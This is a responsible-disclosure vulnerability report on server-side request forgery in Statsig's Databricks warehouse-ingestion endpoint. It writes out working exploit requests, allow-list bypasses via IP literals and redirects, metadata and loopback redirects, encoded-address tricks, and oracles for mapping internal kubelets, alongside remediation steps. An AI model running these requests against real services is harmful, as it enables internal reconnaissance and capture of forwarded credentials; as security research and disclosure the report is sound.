# Statsig — server-side request forgery on the warehouse-ingestion connection endpoint: a project **Member** directs a request from Statsig's production egress into internal network space, and the egress allow-list is bypassable with an IP literal

**Severity:** CVSS 4.6 (Medium) — `AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N`
**Tenant:** both self-owned, no third-party tenant. **REST ingestion route** — project `4IM7HTtUKEEctrmIy6IrJm` (*"Mohamed Gaber's Project"*), triggered with a company-scoped Console API key `console-n9…cgA1` of that project. **GraphQL hybrid route** — project `4n6HCY59mDqwX1iSZQtNvx` (*AmpHuntProject*), driven end-to-end by a **plain Member** `mohamed-9499-3@agentmail.to` with no administrative role. The kubelet map and the timing oracle were measured through the **REST** route on `4IM7HTtUKEEctrmIy6IrJm`; the hybrid-route reach table on `4n6HCY59mDqwX1iSZQtNvx`.

## Summary

`POST /console/v1/ingestion/connection/databricks` builds a URL from two caller-supplied fields — `host` and `path` — and makes the Statsig service open an outbound `POST https://<host><path>` to it. There is **no allow-list, no IP-range check, and no scheme or port validation**. The service runs in GCP (`us-west1`) and its egress reaches internal network space. The endpoint is reachable with **any Console API key** — `201` for both a company-scoped key and a plain Member's personal key — so a project Member with no administrative role can trigger it. The same field set is also reachable **without any gate** over GraphQL via `setup_hybrid_databricks_connection`, whose sink is `consoleComputePath`, not `path` (`path` is accepted and never read).

Three things make this worse than a plain SSRF, and one thing bounds it:

1. **The request carries the caller's `Authorization` header forward** to the chosen host — captured on our listener. **First hop only:** on a redirect hop the header is stripped (`node-fetch` removes credentials cross-host).
2. **Redirects are followed**, including `302` into `169.254.169.254` and into `127.0.0.1`.
3. **The egress allow-list is bypassable, two independent ways** — the decisive measurement:

```
host = "webhook.site"                       -> 503 upstream connect error or disconnect/reset before headers.
                                               reset reason: connection termination, and the destination records NO request
host = "<webhook.site's IP literal>"        -> reached successfully      (bypass 1: IP literal)
host = <our host> -> 302 -> "webhook.site"  -> DELIVERED                 (bypass 2: redirect hop)
```

The status string alone is **not** a reliable "blocked" signal — the same `503` is returned for a request that is demonstrably delivered — so the discriminator used throughout is **whether the destination captured the request**. The request is provably caller-directed and originates from Statsig's infrastructure:

```
POST /console/v1/ingestion/connection/databricks
{"token":"dapi-…","host":"178.63.67.106","path":"/<listener-token>/ipbypass-1","verified":false}
-> 201 {"message":"Failed to create ingestion: DatabricksConnectionError:
                  Received a response with a bad HTTP status code: 418"}

listener capture:
  source ip       34.168.242.172          <- Statsig's egress (GCP us-west1)
  user-agent      NodejsDatabricksSqlConnector/1.11.0 (Node.js 24.16.0; Linux 6.12.94+)
  content-type    application/x-thrift
  authorization   Bearer <the caller's token, forwarded>
  body            50-byte Thrift TOpenSession frame (captured byte-exact)
```

**The SSRF is blind** — no response body ever reaches the caller (measured: `/httpbin/status/204` returns `"bad HTTP status code: 204"` with zero body bytes; a marker placed in the body never surfaced). The metadata read stops at exactly one named control: any `http://` destination returns `Protocol "http:" not supported. Expected "https:"` (Node `ERR_INVALID_PROTOCOL`), so the scheme is pinned to TLS, and `169.254.169.254:443` presents an mTLS listener demanding a client certificate (`SSL alert number 116`).

**Not a duplicate of `SUBMISSION-RC-SSRF.md` (Amplitude):** different vendor, product, codebase, route and fix — this report's fix is destination validation plus redirect and port policy in the **Databricks SQL connector** used by Statsig's warehouse ingestion, the Amplitude report's is destination validation plus a pinned proxy egress in the **Houston content-source fetcher**. The egress origins are opposite: this finding egresses from **Statsig's own production network** and reaches **internal and link-local address space**; the Amplitude finding egresses through a **third-party scraping proxy** (ScrapingBee) and cannot touch Amplitude's internal network at all. They share only the vulnerability class (CWE-918) and should be assessed and rewarded separately.

## Repro

**Schema** (vendor's own OpenAPI spec, version `20240601`): `IngestionCreateDatabricksConnectionContractDto` — required `token`, `host`, `path`; `host` and `path` are concatenated after a forced `https://`.

**1. Caller-directed outbound request, proven by listener capture:**

```
POST /console/v1/ingestion/connection/databricks HTTP/1.1
Host: statsigapi.net
STATSIG-API-KEY: *** Console API key>
Content-Type: application/json

{"token":"dapi-…","host":"178.63.67.106","path":"/<listener-token>/ipbypass-1","verified":false}
```
```
HTTP/1.1 201 Created
{"message":"Failed to create ingestion: DatabricksConnectionError:
            Received a response with a bad HTTP status code: 418"}
```
```
listener recorded: source ip 34.168.242.172, user-agent NodejsDatabricksSqlConnector/1.11.0
                   (Node.js 24.16.0; Linux 6.12.94+), content-type application/x-thrift,
                   content-length 50, authorization Bearer <the caller's token, forwarded>,
                   traceparent 00-db3d0c00…, body 50-byte Thrift TOpenSession frame
```

The `201` plus the listener hit together prove the request originated from Statsig's infrastructure, carried caller-controlled destination data, and forwarded the caller's credential.

**2. A triager can reproduce this with no Statsig account at all** (public callback, no listener to host):

```
POST /console/v1/ingestion/connection/databricks
{"token":"","host":"ntfy.sh","path":"/<a-unique-topic>","verified":false}
-> 201   (the connector retries 3x, so three requests arrive)

then poll:  GET https://ntfy.sh/<a-unique-topic>/json?poll=1
-> three messages, ~10 s apart
```
Listener-free status oracle: `{"host":"example.com","path":"/"}` returns `201 … bad HTTP status code: 405` — `example.com` answers `405` to a `POST`, which the service reflects back.

**3. Reach characterisation (REST route):**

| Target | Result |
|---|---|
| `169.254.169.254` (cloud metadata) | **connected** — TCP + TLS; the peer demanded a client certificate (`SSL alert number 116`) |
| `metadata.google.internal` | **connected** — same |
| `127.0.0.1`, `localhost` | connection attempted → `ECONNREFUSED` |
| `100.100.100.200` (Alibaba metadata) | dropped |
| `302` redirect from our host | **followed** — our listener logged the follow-up `GET` |
| `302` redirect into `169.254.169.254` | **followed** |
| `302` redirect into `127.0.0.1` | **followed** |

**4. Redirect mechanics — the second hop is a less-controlled request primitive:**

| Property | Measured |
|---|---|
| **Method + body preservation** | `307`/`308` deliver **POST + the 50-byte Thrift `TOpenSession` frame** — sha256 `b47a9745…3362`, **identical to the direct hop taken in the same run** (re-verified 2026-09-23: 307 → 3× 50-byte messages at the destination, 302 → 0 messages). `301`/`302`/`303` degrade to `GET` with an empty body. The frame carries a per-session field, so the absolute hash differs between runs — the meaningful fact is the within-run equality. |
| **Port control** | the `host` field rejects `:80` (`Invalid URL`); a **redirect destination does not**. `https://169.254.169.254:8443/` → timeout, while `https://169.254.169.254/` → mTLS alert — the port **overrode 443**. |
| **Outbound port 80** | `https://<ip>:80/…` → `EPROTO … wrong version number` — a TCP connection to port 80 was established and answered in plaintext. |
| **Scheme downgrade** | **refused.** Any `http://` redirect destination returns `Protocol "http:" not supported. Expected "https:"`. `gopher`, `file` and `dict` are closed. |
| **Header injection** | CRLF is rejected (`is not a legal HTTP header value`); a tab stays inside the value. |
| **Redirect depth** | unmeasured. |

**5. The egress allow-list is bypassable — two independent ways:**

```
host = "webhook.site"                      -> 503 upstream connect error…, no capture at the destination
host = "<webhook.site's IP literal>"       -> reached successfully      (bypass 1)
host = <our host> -> 302 -> "webhook.site" -> DELIVERED                 (bypass 2)
```
**Bypass 1** — the control is applied to the **hostname**, so addressing the same server by an IP literal walks past it. **Bypass 2** — the blocklist is **not applied to redirect hops at all**; redirecting to a blocked hostname delivers the request, complete with POST method and body under `307`/`308`.

**6. No address filter exists.** Every alternative encoding reached the metadata listener: decimal (`2852039166`), IPv4-mapped IPv6 (`[::ffff:169.254.169.254]`) and a trailing-dot form. Octal, hex, decimal, IPv4-mapped, `nip.io`, `@`-userinfo and `#`-fragment forms all resolved and reached loopback. Whatever validation exists on `host` is limited to the port and the scheme, not the address.

**7. The second, ungated route to the same primitive:**

```
setup_hybrid_databricks_connection        (persisted operation d047cb99…)
  takes the same host / path / token / oauthClientID as WhConnectionUpdateDto.databricks
  and makes the service fetch https://<host><consoleComputePath>
```
The sink on this route is **`consoleComputePath`, not `path`** — `path` is accepted and never read. Measured: `{"host":"example.com","path":"/zz-audit-path-should-be-ignored"}` returns `405`, i.e. the service requested `https://example.com/` and ignored `path` entirely. Reach is identical to the REST route, and it fires on **both** `dryRun: true` ("Test Connection") and `dryRun: false` (save):

| Destination | Result |
|---|---|
| `127.0.0.1` | `ECONNREFUSED 127.0.0.1:443` |
| `10.0.0.1` | `ECONNRESET` |
| `169.254.169.254` | TLS handshake completed → `tlsv13 alert certificate required` (alert 116) |
| `metadata.google.internal` | same |
| `example.com` | `405` |

This one is reachable by a plain project Member — the demoted test account ran the whole chain alone, with no administrative role and no review step. The `PATCH /console/v1/wh_connections` contract (the only REST one carrying credential fields) is behind a Warehouse-Native gate (`400 "Project is not a WHN project"`, three server-side controls, none settable by a customer — 10 flip attempts, all refused); that gate is real and irrelevant, because the same field set is reachable without it over GraphQL.

**Controls**

* **The oversight, not a design choice** — three sibling routes take a caller-supplied host and enforce **three different policies**: `POST /console/v1/ingestion/connection/databricks` (REST) **accepts** a raw IP-literal host; `upsert_databricks_script_job_connection` (GraphQL) **rejects** it — `"Raw IP-literal hosts are not allowed"`; `setup_hybrid_databricks_connection` (GraphQL) **accepts** it. A guard against raw IP-literal hosts exists in the codebase and was applied to one route and not the other two.
* **CRLF / protocol smuggling — tested and closed** on all four URL-construction sinks (REST `path`, REST `host`, hybrid `consoleComputePath`, hybrid `host`): raw CR/LF are stripped by WHATWG URL parsing and the remainder is concatenated; `%0d%0a` survives opaquely and is never decoded. No injected header, no second request, on either route — structural, because the connector builds URLs through `new URL()`.
* **Kubelet anonymous access — closed.** `--anonymous-auth` defaults to false since Kubernetes 1.6 and GKE disables it; `/healthz` returns 401 where an anonymous kubelet returns 200. No pod spec, env var, secret, service-account token or metrics body was obtained. A 302-based POST→GET conversion changes nothing — authentication precedes method handling.
* **Response-body read — closed against a 2xx:** `POST /httpbin/status/204` returns `"bad HTTP status code: 204"` with zero body bytes, and a marker placed in the body never surfaced. Metadata read was also attempted via four https-reachable indirections (Next.js image optimiser, console route handlers, internal proxies, all 324 Console API operations) and failed.
* **No credential-theft shape:** no reachable field makes Statsig fetch a URL **and attach its own identity**. `oauthClientID` is fenced by a Databricks-host allowlist (`"OAuth is not supported for <host>"`), and the `token` field is the caller's own bearer sent to the caller's own host.
* **The two routes do not share one egress policy:** `10.0.0.1` returns `ECONNRESET` (11.3 s) through the GraphQL route but `TIMEOUT` through the REST route — fixing one route does not fix the other.
* **GCP metadata header-check bypasses were tested and returned the byte-identical `SSL alert 116`** (`computeMetadata//v1/…`, the `v1beta1` path, `;`-truncation): the failure happens at TLS, before a path or a header exists, so those bypasses are **unobservable rather than refuted**.

## Impact

* **Network position.** A project Member — no administrative role — can make Statsig's production service issue requests from inside its own network to any host, port and path they choose, borrowing the service's network position and its credentials.
* **Internal Kubernetes network map, with two oracles that need no listener and no credential.** Bounded probing of the addresses the connector can reach produced a map of Statsig's internal network:
  * **Kubelet-shaped addresses identified by port profile.** Measured 2026-09-20: `10.138.0.2:10250` answers at the HTTP layer; `10.138.0.3:10250` answers (404 on a fabricated path, 401 on `/healthz`); `10.138.0.3:8443 / :8080 / :3128 / :6443 / :10251` → `ECONNRESET`; `10.138.0.1 / 10.138.0.10` silent; control `192.0.2.1:10250` → `TIMEOUT 30 s`. **These are auto-mode VM leases and they rotate** — re-measured 2026-09-23 (3 samples each): `10.138.0.2` → `TIMEOUT` ×3 (median 31.0 s), `10.138.0.3` → `TIMEOUT` ×3 (median 31.2 s), `10.138.0.1` → `TIMEOUT` ×3 (median 31.1 s), **`10.138.0.10` → `ECONNRESET`**. On `:10250` the two live kubelets are now **`.2` and `.10`**, with the same port profile. **The stable claim is the behaviour set, not the addresses:** inside the documented `10.138.0.0/20` the oracle returns three distinguishable classes — `TIMEOUT`, `ECONNRESET`, and a real `HTTP <code>` — and the pair of kubelet-shaped addresses moves between runs. Any single-run address list is a snapshot, not an inventory.
  * **Oracle 1 — route existence on an authenticated internal API (401 vs 404):** `401` means the route EXISTS on the kubelet, `404` that it does not. `/healthz /metrics /pods /runningpods/ /stats/summary /configz` → `401` (all exist); `/version`, `/` and a fabricated path → `404`. Route enumeration against an internal API with no credential.
  * **Oracle 2 — reachability with no callback (≥20× timing gap):** five samples each on 2026-09-20 — `169.254.169.254` → TLS alert 116, **median 1.4 s**; `192.0.2.1` (guaranteed unroutable) → **median 31.6 s**, a ~22× separation. Re-measured 2026-09-23 (3 samples each): medians **0.99 s** and **31.1 s**, a **31×** separation. The gap is at least 20× and has widened.
  * **Proven internal-only:** direct TCP from the public internet to both kubelets times out. The SSRF is the **only** path to them.
* **Cloud metadata.** The link-local metadata address is reachable. On a target where the metadata service answers on `:443` without client-certificate enforcement, that is instance-credential theft; here it stopped at the mTLS demand.
* **Credential forwarding (first hop only).** An attacker who controls the host named in the first request receives a live credential belonging to the caller. On a redirect hop the header is stripped by the client library, so a redirect cannot carry it further.
* **Allow-list bypass, two independent ways**, and **redirect chaining with method and body**: because `307`/`308` are followed, a host the attacker legitimately controls can bounce the **original POST and its body** — byte-identical to the direct request — into internal space. The attacker never has to name an internal address directly, which is what most SSRF mitigations look for.
* **Internal-service reach:** `statsigapi.net`, `api.statsig.com` reached, answering `403` — the service can address Statsig's own backends from inside. (`console.statsig.com` → `503 Timeout has occurred`, a distinct behaviour worth noting for the maintainers.)

**Ceiling.** **The SSRF is blind.** No response body ever comes back to the caller: targets answering `200` with a JSON, text or HTML body (`/anything`, `/base64/<marker>`, `/html`, `/robots.txt`, `/status/200`) return only `read ECONNRESET` or the HTTP status — **no body bytes**, and a marker placed in the body never surfaced. No metadata content is readable (the metadata listener demands a client certificate), the internal service that answers is auth-gated, and the scheme guard holds. The port is rejected on the `host` field itself (`DatabricksConnectionError: Invalid URL`), so no port enumeration and no HTTP downgrade that way. The impact that survives is an internal **reachability and topology oracle**, plus an unpoliced redirect hop and an egress-control bypass — which is `C:L`, not `C:H`. For this to become Critical, one of these would have to hold, and none did: a response body reaching the caller (it does not), a metadata service answering on `:443` without client-certificate enforcement (it demands one), or an internal service on `:443` that performs a state change when reached (none was found).

**CVSS terms and the measured fact behind each:**

| Term | Support |
|---|---|
| `AV:N` | The Console API is reachable over the internet. |
| `AC:L` | One request; no race, no timing, no special condition. |
| `PR:L` | Requires a project account — measured `201` with a plain Member's personal key and with a company-scoped key. |
| `UI:N` | No victim interaction; the attacker is the caller. |
| `S:C` | The vulnerable component is Statsig's ingestion service; the impacted component is the **internal network it can reach** (kubelets, metadata, Statsig's own backends). |
| `C:L` | Measured: three distinguishable internal behaviours readable from the error string alone, plus route enumeration (`401` vs `404`) on an internal API — but **no body bytes, no metadata content**. |
| `I:N` | No state change on any reached internal service was demonstrated. |
| `A:N` | No availability term is claimed. |

**Open proof gaps, stated not claimed:** `PATCH /console/v1/wh_connections` (`WhConnectionUpdateDto`, with databricks/snowflake/bigquery credential fields) was **not tested** — it may carry the same defect; the minimum role for triggering this was not re-measured in this run (the previous wave recorded `201` for both a company-scoped key and a Member's personal key); and whether the forwarded `Authorization` can satisfy an internal endpoint requiring a specific bearer was asserted as a capability, not demonstrated.

## Remediation

1. **Validate the destination, not the string.** Resolve `host` and reject any address in a private, loopback, link-local or reserved range (RFC 1918, `127.0.0.0/8`, `169.254.0.0/16`, `::1`, `fc00::/7`) — and re-check **after** DNS resolution and on **every redirect hop**.
2. **Do not follow redirects** for this connector, or restrict them to the originally-resolved host.
3. **Apply the allow-list to the resolved address**, not the hostname, so an IP literal cannot walk past it.
4. **Do not forward the caller's `Authorization` header** to a host the caller supplied; the connector should authenticate to the destination with the credential the *administrator* stored, not the caller's key.
5. **Require an administrative role** for creating warehouse connections — the endpoint is currently reachable with any Console API key.
6. **Pin the scheme and port** explicitly, and consider forcing traffic through an egress proxy that enforces the same rules.
7. **Apply one shared destination validator to all three routes.** The guard against raw IP-literal hosts already exists — `upsert_databricks_script_job_connection` enforces it. It is missing from `POST /console/v1/ingestion/connection/databricks` and from `setup_hybrid_databricks_connection`; the fix is to make all three call the same check, not to write a third implementation. This is the shared enabler: patching the two unguarded routes individually leaves the same validator missing from any future route.

---
Evidence: escal/REPORT-STATSIG-INGESTION-SSRF.md, escal/ssrf_evidence_matrix.json, escal/ssrf_evidence_ntfy.json, escal/ssrf_evidence_thrift_body.bin, escal/ssrf_evidence_webhooksite.json, escal/ssrf_evidence_webhooksite_B.json, escal/ssrf_h.py, escal/ssrf_p1.py, escal/ssrf_p2.py, escal/ssrf_p3.py, escal/ssrf_p4.py, escal/ssrf_p5_canary.py, escal/ssrf_p6_ntfy.py, escal/ssrf_p7_ntfy2.py, escal/ssrf_p8.py, escal/ssrf_p9_redir.py, escal/ssrf_p10_cleanup.py, escal/ssrf_p11_ctl.py, escal/ssrf_p12_evidence.py
